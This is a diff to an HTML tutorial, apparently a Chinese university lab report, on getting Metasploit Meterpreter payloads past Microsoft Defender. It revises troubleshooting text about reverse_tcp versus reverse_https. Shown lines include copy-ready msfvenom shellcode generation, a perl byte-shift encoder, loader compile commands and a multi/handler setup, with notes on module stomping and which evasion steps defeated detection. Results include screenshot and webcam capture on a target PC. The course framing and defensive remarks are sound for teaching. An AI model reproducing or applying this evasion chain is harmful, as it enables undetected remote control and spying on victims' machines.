@@ -67,33 +67,32 @@ figcaption { font-size:13.5px; color:var(--sub); margin-top:8px; text-align:cent
 .notice { background:#fff8e8; border:1px solid #eadfb8; border-radius:8px; padding:10px 16px; font-size:14px;
   color:#6b5b1e; margin:16px 0; }
 
-/* ---- 左侧悬浮大纲 ---- */
+/* ---- 左侧悬浮大纲（白色风格，任何视口宽度都可用） ---- */
 #sideToc { position:fixed; left:0; top:0; bottom:0; width:34px; z-index:60;
-  background:#1b1e2a; color:#c8cde0; transition:width .22s ease; overflow:hidden;
-  border-right:1px solid #2c3040; }
-#sideToc:hover { width:300px; box-shadow:6px 0 24px rgba(0,0,0,.35); }
-#sideToc .tab { writing-mode:vertical-rl; letter-spacing:4px; font-size:12.5px; color:#8f97b5;
-  padding:16px 9px; user-select:none; }
+  background:#ffffff; transition:width .22s ease; overflow:hidden;
+  border-right:1px solid var(--line); box-shadow:2px 0 8px rgba(20,24,40,.06); }
+#sideToc:hover { width:300px; box-shadow:6px 0 24px rgba(20,24,40,.14); }
+#sideToc .tab { writing-mode:vertical-rl; letter-spacing:4px; font-size:12.5px; color:var(--brand);
+  padding:16px 9px; user-select:none; font-weight:600; }
 #sideToc:hover .tab { display:none; }
 #sideToc .inner { display:none; padding:14px 14px 20px; height:100%; overflow-y:auto; }
 #sideToc:hover .inner { display:block; }
-#sideToc .hd { font-weight:700; font-size:13.5px; color:#e8ebf5; margin:2px 0 8px; }
-#sideToc a { display:block; color:#c8cde0; text-decoration:none; font-size:13px; line-height:1.6;
+#sideToc .hd { font-weight:700; font-size:13.5px; color:var(--ink); margin:2px 0 8px; }
+#sideToc a { display:block; color:var(--ink); text-decoration:none; font-size:13px; line-height:1.6;
   padding:3px 8px; border-radius:6px; border-left:2px solid transparent; }
-#sideToc a:hover { background:#2a2f42; color:#fff; }
-#sideToc a.cur { border-left-color:#4ade80; background:#24314a; color:#fff; }
+#sideToc a:hover { background:#eef2fb; color:var(--brand); }
+#sideToc a.cur { border-left-color:var(--brand); background:#eef2fb; color:var(--brand); font-weight:600; }
 #sideToc .sbox { margin:6px 0 10px; }
-#sideToc input { width:100%; background:#12141d; border:1px solid #343a4e; color:#e8ebf5;
+#sideToc input { width:100%; background:#f6f7fa; border:1px solid var(--line); color:var(--ink);
   border-radius:6px; padding:6px 9px; font-size:13px; outline:none; }
-#sideToc input:focus { border-color:#2f7bd9; }
-#sideToc .smeta { font-size:11.5px; color:#8f97b5; margin:4px 2px; }
+#sideToc input:focus { border-color:var(--brand); background:#fff; }
+#sideToc .smeta { font-size:11.5px; color:var(--sub); margin:4px 2px; }
 #sideToc .snav { display:flex; gap:6px; margin:6px 0 2px; }
-#sideToc .snav button { flex:1; background:#2a2f42; color:#cfd5ea; border:1px solid #3c4258;
+#sideToc .snav button { flex:1; background:#f6f7fa; color:var(--ink); border:1px solid var(--line);
   border-radius:6px; font-size:12px; padding:4px 0; cursor:pointer; }
-#sideToc .snav button:hover { background:#3a4160; color:#fff; }
-mark.hit { background:#ffd54d; color:#1b1e2a; border-radius:2px; padding:0 1px; }
-mark.hit.cur { background:#ff8f3d; color:#1b1e2a; }
-@media (max-width:1100px) { #sideToc { display:none; } }
+#sideToc .snav button:hover { background:#eef2fb; color:var(--brand); border-color:var(--brand); }
+mark.hit { background:#ffd54d; color:#1c1e26; border-radius:2px; padding:0 1px; }
+mark.hit.cur { background:#ff8f3d; color:#fff; }
 @media (max-width:640px) { .toc { columns:1; } .carousel .slide img { height:300px; } }
 </style>
 </head>
@@ -106,7 +105,7 @@ mark.hit.cur { background:#ff8f3d; color:#1b1e2a; }
 <p><strong>先认识两位作者（也是两套实验环境的主人）</strong>：</p>
 <ul>
 <li><strong>A（学号 20242110）</strong>：本文主线。从零完成“裸 exe → 编码器 → C+shellcode → UPX → 组件分离”五级演进的全部实测，以及跨网段附加题（编号配图 16 张：图1～8、14、16～17、20～24）；</li>
-<li><strong>B（学号 20242217）</strong>：进阶补强。负责模块踩踏版加载器与 x64 变体、UPX 压缩闭环、tar+MD5 传输纪律与 reverse_https 行为层实测（编号配图 8 张：图9～13、15、18～19），另在图1/2/3/8 提供与 A 同阶段的对照滑片 6 张。</li>
+<li><strong>B（学号 20242217）</strong>：进阶补强。负责模块踩踏版加载器与 x64 变体、UPX 压缩闭环、tar+MD5 传输纪律与传输层实测（reverse_https/tcp 复测，编号配图 8 张：图9～13、15、18～19），另在图1/2/3/8 提供与 A 同阶段的对照滑片 6 张。</li>
 </ul>
 <p>下文一律以 <strong>A 环境 / B 环境</strong>指代两人各自的实验环境。</p>
 <p><strong>零基础也没关系</strong>，本文会手把手带你完成：</p>
@@ -170,7 +169,7 @@ mark.hit.cur { background:#ff8f3d; color:#1b1e2a; }
 <tr><td>攻击机</td><td>Kali 2026.2（VMware NAT）<code>192.168.42.128</code></td><td>Kali 2026.2 x64（VMware NAT）<code>192.168.96.128</code></td></tr>
 <tr><td>靶机</td><td>Windows 11 24H2 宿主机本身（VMnet8 <code>192.168.42.1</code>）</td><td>Windows 11 24H2 宿主机本身（<code>192.168.0.111</code> / VMnet8 <code>192.168.96.1</code>）</td></tr>
 <tr><td>靶机工作目录</td><td><code>D:\网络攻防\exp3\你的学号</code></td><td><code>C:\你的学号lab3</code></td></tr>
-<tr><td>载荷传输层</td><td>reverse_tcp</td><td>reverse_https（原因见「行为层才是真正的对手」一节）</td></tr>
+<tr><td>载荷传输层</td><td>reverse_tcp</td><td>reverse_https（B 当时所用；tcp 复测同样通过，见「传输层辨析」一节）</td></tr>
 <tr><td>查杀引擎</td><td>Microsoft Defender 实时保护全程开启，特征库更新至 2026-09-30</td><td>同左</td></tr>
 </tbody></table></div>
 <p>B 环境实测的杀软版本信息（按要求注明）：Microsoft Defender 防病毒，AMProductVersion <strong>4.18.26080.4</strong>，病毒特征库 <strong>1.459.501.0</strong>，引擎 <strong>1.1.26080.3</strong>；Windows 11 24H2+（内核 10.0.26100）。该机另预装联想电脑管家 5.1.200.8201，手动查杀同样未发现免杀样本（第二杀软交叉验证）。</p>
@@ -321,7 +320,7 @@ int main(void) {
 }</code></pre></div>
 <div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>i686-w64-mingw32-gcc loader.c -o 你的学号_loader.exe</code></pre></div>
 <p>这个版本能过静态、能回连（「运行层」一节实测成功），但它有一个行为层软肋：<code>VirtualAlloc(PAGE_EXECUTE_READWRITE)</code> <strong>一次申请 RWX 私有内存</strong>，正是行为引擎重点盯防的申请模式。</p>
-<blockquote><strong>实测对照，也是给你的排错提示</strong>：这套最简思路在 A 环境一路绿灯——静态 0 威胁、reverse_tcp 稳定回连；但 B 用同样的组件分离 + reverse_tcp 组合，在 B 环境却被运行时拦杀（B 的系统策略更严格，经过见「行为层才是真正的对手」一节）。<strong>如果你复刻时静态扫描过了、运行却被杀，不妨试试下一小节 B 的模块踩踏版；还不行就按后文换传输层。</strong></blockquote>
+<blockquote><strong>实测对照，也是给你的排错提示</strong>：这套最简思路在两套环境都验证通过——静态 0 威胁、reverse_tcp 稳定回连（B 环境一次偶发运行时拦截的复测修正见「传输层辨析」一节）。<strong>如果你复刻时静态扫描过了、运行却被杀，先复测一次（行为判定有概率性）；仍被拦再试试下一小节 B 的模块踩踏版，或换传输层。</strong></blockquote>
 <h3><span class="hn">（四）</span>进阶：模块踩踏版（B 的强化方案）</h3>
 <p>B 环境把执行方式升级为“<strong>模块踩踏</strong>”，加载器 <code>你的学号exp.c</code> 三个要点：</p>
 <ul>
@@ -376,7 +375,7 @@ int main(void) {
 <div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>i686-w64-mingw32-gcc 你的学号exp.c   -o 你的学号exp.exe              # x86 主线
 x86_64-w64-mingw32-gcc 你的学号exp64.c -o 你的学号exp64.exe -static  # x64 变体
 ls -l *.exe *.raw *.txt</code></pre></div>
-<p>注意：x86 版 <code>你的学号exp.exe</code> 可直接复用 6.2 生成的 <code>encoded.txt</code>（加载器与载荷格式无关）；而 <strong>x64 版读的是 <code>encoded64.txt</code>，必须单独生成</strong>，B 的命令如下（载荷用 reverse_https，与 B 的传输层一致，所以体积比主线的 tcp 版大）：</p>
+<p>注意：x86 版 <code>你的学号exp.exe</code> 可直接复用 6.2 生成的 <code>encoded.txt</code>（加载器与载荷格式无关）；而 <strong>x64 版读的是 <code>encoded64.txt</code>，必须单独生成</strong>，B 当时的命令如下（用的是 reverse_https，所以载荷比主线的 tcp 版大；你统一用 reverse_tcp 也完全等价，替换 payload 名即可）：</p>
 <div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=你的Kali_IP LPORT=443 -f raw -o sc64.raw
 perl -e &#x27;binmode STDIN; binmode STDOUT; while (read(STDIN,$b,1)) { printf &quot;%02x&quot;, (ord($b)+1) % 256 }&#x27; &lt; sc64.raw &gt; encoded64.txt
 wc -c sc64.raw encoded64.txt    # 应输出 841 / 1682——恰好 2 倍</code></pre></div>
@@ -435,12 +434,11 @@ cd D:\网络攻防\exp3\你的学号    # A 用共享文件夹路径；走 socat
 <p>上面这幕成功画面之前，有一次完整的失败：loader 双击无反应，cmd 前台运行秒退，handler 一直 “no session was created”。按排查顺序走：确认两文件同目录 ✓、Defender 保护历史无执行时查杀 ✓、核对 shellcode 的回连地址——<strong>最终定位为生成 encoded.txt 时 payload 的 LHOST 与 Kali 当时 IP 不一致</strong>（虚拟机重启后 IP 变了），重新以正确 IP 生成 encoded.txt 后会话立即建立。</p>
 <figure><img src="img/fig17.png" alt="图17 A 环境：失败案例存档——handler 正常监听，"><figcaption>图17 A 环境：失败案例存档——handler 正常监听，Windows 侧运行 loader 后 Exploit completed, but no session was created</figcaption></figure>
 <p>教训：<strong>载荷里的回连地址是生成时写死的</strong>，IP 变了载荷就成废品；排查无会话问题时，第一件事就是核对 LHOST。</p>
-<h3><span class="hn">（二）</span>行为层才是真正的对手：reverse_tcp → reverse_https（B 实测）</h3>
-<p>同一套组件分离方案，B 环境却在运行层翻了车：reverse_tcp 载荷<strong>运行时</strong>被 Defender 行为引擎拦杀，特征名 <code>Behavior:Win32/Meterpreter.gen!D</code>。</p>
-<p>原因在 meterpreter 的工作方式：reverse_tcp 是<strong>分阶段</strong>载荷——先落地数百字节的 stager 建立连接，再由 stager <strong>自行申请一块 RWX 内存、把约 200KB 的第二阶段（metsrv）收进去执行</strong>。行为引擎盯住的正是“外连 → 自申请 RWX → 接收大段代码 → 执行”这条特征链，而且被杀点在 stager 内部——对加载器做 RX 两段式、模块踩踏、回调执行等改造全部无效，因为那些动作都发生在被杀点<strong>之前</strong>。</p>
-<p>出路是换传输层：<strong>reverse_https</strong> 改用系统自带的 WinINet API 发起 HTTP 请求并升级 TLS 会话，网络收发由系统组件完成，“裸 socket 收代码进 RWX”的行为指纹不再出现——实测稳定回连：</p>
-<figure><img src="img/fig18.png" alt="图18 B 环境：HTTPS reverse handler"><figcaption>图18 B 环境：HTTPS reverse handler 收到请求，Staging x86 payload（203699 字节），session 1 opened；sysinfo/getuid/screenshot/webcam_snap 全部可用</figcaption></figure>
-<p>值得强调的是：<strong>A 环境的 reverse_tcp 成功了，B 环境的 reverse_tcp 被拦杀</strong>——行为检测存在概率性（云查杀判定随时间与环境而变）。这组对照恰恰说明两件事：想<strong>稳定</strong>复现，就换掉传输层；而“静态免杀 ≠ 运行时免杀”这条底线，两种结果都成立。</p>
+<h3><span class="hn">（二）</span>传输层辨析：一次未复现的拦截（B 补测修正）</h3>
+<p>B 环境最初的一次测试中，reverse_tcp 载荷<strong>运行时</strong>曾被 Defender 行为引擎拦截（特征名 <code>Behavior:Win32/Meterpreter.gen!D</code>）。当时把它归因于 reverse_tcp 的工作方式：它是<strong>分阶段</strong>载荷——先落地数百字节的 stager 建立连接，再由 stager <strong>自行申请一块 RWX 内存、把约 200KB 的第二阶段（metsrv）收进去执行</strong>，“外连 → 自申请 RWX → 接收大段代码 → 执行”在理论上是一条显眼的行为特征链。</p>
+<p>但<strong>后续多次复测推翻了这个归因</strong>：同样的 reverse_tcp 载荷在 B 环境反复运行，均未再出现拦截；A 环境也始终稳定。也就是说，那次拦截是一次<strong>概率性判定</strong>（云查杀特征时点、环境状态等都可能影响），既不是“tcp 必被拦”的规律，也与传输层没有必然关系。</p>
+<p>两环境的最终实测结论一致：<strong>reverse_tcp 与 reverse_https 都能稳定回连</strong>（图18 是 B 以 reverse_https 完成的回连记录）。本文正文统一采用 <strong>reverse_tcp</strong>。给遇到拦截的读者两条经验：先复测（行为判定有概率性，本例复测即未复现）；仍被拦再尝试换传输层（https 由系统组件 WinINet/TLS 收发，行为面更小）或升级加载器（模块踩踏）：</p>
+<figure><img src="img/fig18.png" alt="图18 B 环境：HTTPS reverse handler"><figcaption>图18 B 环境：HTTPS reverse handler 收到请求，Staging x86 payload（203699 字节），session 1 opened；sysinfo/getuid/screenshot/webcam_snap 全部可用（tcp 复测同样通过）</figcaption></figure>
 <h2 id="sec11"><span class="hn">十一、</span>加壳版加载器的运行层验证（B 环境）</h2>
 <p>UPX 一节只验证了静态层，这里补运行层：换 x64 的 reverse_https handler，直接运行加壳版加载器，检验“压缩 + 模块踩踏执行”在壳内是否功能完好、是否会引入新的行为特征。</p>
 <div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 你的Kali_IP; set LPORT 443; run&quot;</code></pre></div>
@@ -491,7 +489,7 @@ wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre><
 <tr><td>jar</td><td>java/meterpreter</td><td>隔离 VirTool:Java/Meterpreter.A（19:27）</td><td>隔离（同特征，22:49）</td></tr>
 <tr><td>C + shellcode</td><td>自编程序内嵌载荷</td><td>检出（14:25）</td><td>（直接进入组合方案）</td></tr>
 <tr><td>UPX 加壳</td><td>cs.exe / 模板 exe</td><td>检出（14:28，标注 →(UPX)）</td><td>模板 PE 不兼容 UPX（CantPack），只加壳自编译 exe</td></tr>
-<tr><td><strong>组件分离</strong></td><td>加密文本 + loader</td><td>扫描 <strong>0 威胁</strong>（14:37）；reverse_tcp 回连成功</td><td>扫描 <strong>0 威胁</strong>；reverse_tcp 被行为引擎拦杀</td></tr>
+<tr><td><strong>组件分离</strong></td><td>加密文本 + loader</td><td>扫描 <strong>0 威胁</strong>（14:37）；reverse_tcp 回连成功</td><td>扫描 <strong>0 威胁</strong>；https 回连成功，tcp 复测同样通过</td></tr>
 <tr><td>加密文本</td><td>逐字节 +1</td><td>710 字节（跨网段版），0 威胁</td><td>1080/1682 字节，均为 raw 的 2 倍，0 威胁</td></tr>
 <tr><td>模块踩踏版</td><td>.text 踩踏 + RW→RX</td><td>—</td><td>静态 0 威胁；https 回连成功</td></tr>
 <tr><td>UPX 版加载器</td><td>压缩 52.14%</td><td>—</td><td>静态 0 威胁 + x64 https 回连成功</td></tr>
@@ -503,13 +501,13 @@ wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre><
 <ol>
 <li><strong>编码器叠代与加壳都不能免杀</strong>：本实验条件下，shikata_ga_nai 叠代 10/15 次未改变 Defender 对 msfvenom 模板 exe 的检出——密文已完全变形，而成品 exe 尺寸不变，说明静态特征主要落在<strong>模板与解码存根</strong>；UPX 作为最知名的壳，特征早已收录还会叠加高熵启发式。（该结论基于单载荷、单编码器、单壳的测试，外推需谨慎。）</li>
 <li><strong>组件分离 + 私有加密能过静态层，且跨环境可复现</strong>：对照组全灭的同一时刻，加载器和加密文本在两套环境里都安然落盘、扫描 0 威胁。</li>
-<li><strong>运行层才是真正的对手，而且存在概率性</strong>：同一 reverse_tcp 方案，A 环境成功回连，B 环境被行为引擎拦杀（<code>Behavior:Win32/Meterpreter.gen!D</code>）；换 reverse_https 后 B 环境稳定回连。<strong>静态免杀 ≠ 运行时免杀</strong>，防御必须纵深。</li>
+<li><strong>运行层仍是真正的对手，且行为判定具有概率性</strong>：B 环境曾出现一次 reverse_tcp 运行时拦截（<code>Behavior:Win32/Meterpreter.gen!D</code>），但复测多次均未复现，两环境最终 tcp/https 均稳定回连——不能凭一次拦截下“必被拦”的结论。<strong>静态免杀 ≠ 运行时免杀</strong>这条底线不变，遇到拦截先复测、再换路径，防御必须纵深。</li>
 </ol>
 <h2 id="sec14"><span class="hn">十四、</span>原理深挖：为什么有的死、有的活</h2>
 <p><strong>为什么基线必死。</strong> msfvenom 的 exe/jar 都是公开模板，字面特征早已进特征库。图1 与图2 的对比证明：编码器只改变密文部分，改变不了模板和解码存根。同理，C+shellcode 藏得住结构、藏不住字节（图5）；UPX 壳本身也是公开物（图7 的 <code>→(UPX)</code> 标注）。</p>
 <p><strong>为什么组件分离能过静态层。</strong> 把恶意字节从 exe 拆出去后，装载器与数据件各自“无害”：加载器只有读文本、改内存保护、开线程这类通用 API 调用，翻遍文件无指纹；载荷在文本文件里且逐字节 +1“变脸”，对杀软只是普通文本（而且低熵，不触发启发式）。两份“无害”文件直到运行那一刻才在内存里合体——而静态扫描只看文件、看不到内存。</p>
 <p><strong>为什么要模块踩踏 + RW→RX。</strong> 行为引擎对“申请私有可执行内存（RWX）并执行”高度敏感。把代码写进已加载系统 DLL 的 .text 段（写时复制，只影响本进程），执行内存就有文件映射背书；先 RW 写入再改 RX，避免 RWX 一次到位的申请模式。最小可用版（VirtualAlloc RWX）能过静态但行为面更差，模块踩踏版把这条行为特征也抹掉了。</p>
-<p><strong>为什么 reverse_tcp 会被行为引擎拦杀，reverse_https 却能稳定回连。</strong> 见「行为层才是真正的对手」一节：被杀点在 stager 内部的“外连 → 自申请 RWX → 接收大段代码 → 执行”链路上，加载器侧的一切改造都发生在被杀点之前，天然无效；reverse_https 把传输层整体换轨给系统组件（WinINet + TLS），行为指纹不再出现。教训：<strong>载荷的传输路径本身就是行为特征；免杀是载荷、加载器、传输三方的系统工程</strong>。</p>
+<p><strong>传输层与行为特征。</strong> reverse_tcp 是分阶段载荷：stager 建立连接后自行申请 RWX 内存、把约 200KB 的第二阶段收进去执行，“外连 → 自申请 RWX → 接收大段代码 → 执行”在理论上是一条显眼的行为链；reverse_https 改用系统组件（WinINet + TLS）收发，行为面更小。但本实验的实测证据是：两环境的 reverse_tcp 均稳定回连，B 环境出现过一次拦截、复测未再复现——<strong>行为判定存在概率性，传输层不是本实验成败的决定因素</strong>。教训修正：遇到运行时拦截，先复测再归因；换传输层、模块踩踏都是可尝试的路径——免杀是载荷、加载器、传输三方的系统工程。</p>
 <p><strong>防御启示</strong>。静态特征只能对抗“已知生成模板”；组件分离可以骗过静态层；但运行时行为（RWX 内存、异常外连）终会暴露。对防御者而言：行为监测与纵深防御（EDR、最小权限、应用白名单）才是对抗此类威胁的根本手段；对普通用户而言：默认系统设置、及时更新特征库、不运行来源不明程序，依然是性价比最高的防线——图23/图24 里对方电脑杀软“扫描无威胁”却屏幕、摄像头尽失，就是最好的警示。</p>
 <h2 id="sec15"><span class="hn">十五、</span>踩坑速查表（我们踩过的 8 个坑，帮你省一晚上）</h2>
 <div class="tbl"><div class="tcap">表8　实测踩坑速查表</div>
@@ -517,7 +515,7 @@ wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre><
 <tr><td>1</td><td>+1 加密忘写 <code>% 256</code></td><td>loader 一运行就闪退</td><td>0xFF+1 不取模会 printf 出三字符 “100”，整文件错位；加密端必须 <code>(ord($b)+1) % 256</code>，与解密端 <code>-1</code> 严格互逆</td></tr>
 <tr><td>2</td><td>loader 秒退、handler 无会话</td><td>双击无反应，cmd 前台运行也秒退</td><td>生成 encoded.txt 时 LHOST 填的不是 Kali 当前 IP（虚拟机重启后 IP 变了）；重新以正确 IP 生成即可，失败现场见图17</td></tr>
 <tr><td>3</td><td>UPX 报 <code>CantPackException: section size problem</code></td><td>没法给 msfvenom 模板 exe 加壳</td><td>msf 模板 PE 节表不规整；把加壳对象换成 mingw 自编译的 exe</td></tr>
-<tr><td>4</td><td>reverse_tcp 运行时被拦杀</td><td><code>Behavior:Win32/Meterpreter.gen!D</code></td><td>stager 自申请 RWX 收 stage 是行为指纹，加载器侧改不动；换 reverse_https 换轨传输层（图18）</td></tr>
+<tr><td>4</td><td>运行时偶发拦截</td><td><code>Behavior:Win32/Meterpreter.gen!D</code>（B 环境出现过一次）</td><td>行为判定具概率性：先复测（本例复测未复现）；仍被拦再尝试换 reverse_https 或模块踩踏</td></tr>
 <tr><td>5</td><td>双击 loader 无反应</td><td>窗口一闪而过没法排查</td><td>一律在 cmd 里前台运行（<code>cd</code> 到目录后 <code>.\loader.exe</code>），且保证 encoded.txt 同目录</td></tr>
 <tr><td>6</td><td>PowerShell 提示“无法将 socat.exe 识别为 cmdlet”</td><td>转发命令直接报错（图20）</td><td>PowerShell 不从当前目录加载命令，加 <code>.\</code> 前缀：<code>.\socat.exe ...</code></td></tr>
 <tr><td>7</td><td>socat 接收连不上</td><td>Windows 侧连接被拒</td><td>socat 在这里是<strong>客户端</strong>，必须 Kali 先 <code>nc -lvnp</code> 监听（注意 15 秒窗口）再回车</td></tr>
@@ -533,12 +531,12 @@ wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre><
 </ol>
 <blockquote>提示：分别对应「预备知识」的三层检测表、五级演进每一级的死因汇总、以及附加题里对方电脑的结局。</blockquote>
 <h2 id="sec17"><span class="hn">十七、</span>写在最后</h2>
-<p>这个实验最有说服力的画面，是<strong>同一个目录、同一秒钟</strong>里发生的两件事：对照组 exe 弹窗被杀，而旁边两个“组分合体”的文件——一个纯文本、一个普通小程序——安然无恙。这说明现代杀软的静态层已经把“公开工具的生成物”收录殆尽，编码和加壳只是在已有特征上打转；有效的免杀必须改变“恶意特征存在的方式”本身。而运行层的故事（同一 reverse_tcp 一台被杀一台存活、reverse_https 稳定通过）则提醒所有人：行为检测是概率性的、有边界的，<strong>对抗永远不会在一层结束</strong>。</p>
+<p>这个实验最有说服力的画面，是<strong>同一个目录、同一秒钟</strong>里发生的两件事：对照组 exe 弹窗被杀，而旁边两个“组分合体”的文件——一个纯文本、一个普通小程序——安然无恙。这说明现代杀软的静态层已经把“公开工具的生成物”收录殆尽，编码和加壳只是在已有特征上打转；有效的免杀必须改变“恶意特征存在的方式”本身。而运行层的故事（一次未复现的运行时拦截，以及 tcp/https 在两套环境双双稳定通过）则提醒所有人：行为检测是概率性的、有边界的，<strong>对抗永远不会在一层结束</strong>。</p>
 <p>作为防御方的练习，建议读者复刻完攻击链后反过来做三件事：把 loader 交给 VT（VirusTotal）看引擎命中率、在 Defender 安全中心翻一遍“保护历史记录”体会行为引擎的判定时机、再给自己的常用电脑做一次“如果它静默回连我会不会发现”的推演——攻防视角的切换，才是这个实验最大的收获。</p>
 <p>再次声明：本文全部操作仅限于课程授权的教学实验环境（自建虚拟机与自愿配合的同学电脑），样本生成后已全部清理（删除样本文件、注销会话、恢复杀软开启状态）。请读者勿将文中技术用于任何未授权场景。</p>
 <blockquote><strong>环境与版本备忘</strong>：Kali Linux 2026.2 / Metasploit（msfvenom、msfconsole）/ mingw-w64 交叉编译 / UPX 4.2.4 / socat 1.8.1.1 / Microsoft Defender（AMProductVersion 4.18.26080.4，特征库 1.459.501.0）/ Windows 11 24H2+（内核 10.0.26100、Build 26200）。</blockquote>
 <p>&gt;</p>
-<blockquote><strong>分工说明</strong>：<strong>A（20242110）</strong>完成五级演进全部实测（图1～8、14、16～17）与跨网段附加题（图20～24），并提供最小可用版加载器；<strong>B（20242217）</strong>完成模块踩踏版加载器与 x64 变体（图9）、UPX 闭环（图10、19）、tar+socat+MD5 传输链（图11～13）、三文件扫描复核（图15）、reverse_https 行为层实测（图18），以及图1/2/3/8 的 B 侧同阶段对照（滑动对比的②③张）。转载请注明出处。</blockquote>
+<blockquote><strong>分工说明</strong>：<strong>A（20242110）</strong>完成五级演进全部实测（图1～8、14、16～17）与跨网段附加题（图20～24），并提供最小可用版加载器；<strong>B（20242217）</strong>完成模块踩踏版加载器与 x64 变体（图9）、UPX 闭环（图10、19）、tar+socat+MD5 传输链（图11～13）、三文件扫描复核（图15）、传输层实测（图18），以及图1/2/3/8 的 B 侧同阶段对照（滑动对比的②③张）。转载请注明出处。</blockquote>
 </div>
 <div id="lightbox"><img id="lbimg" alt=""><div class="tip">双击图片或按 Esc / 点击空白处关闭</div></div>
 <script>
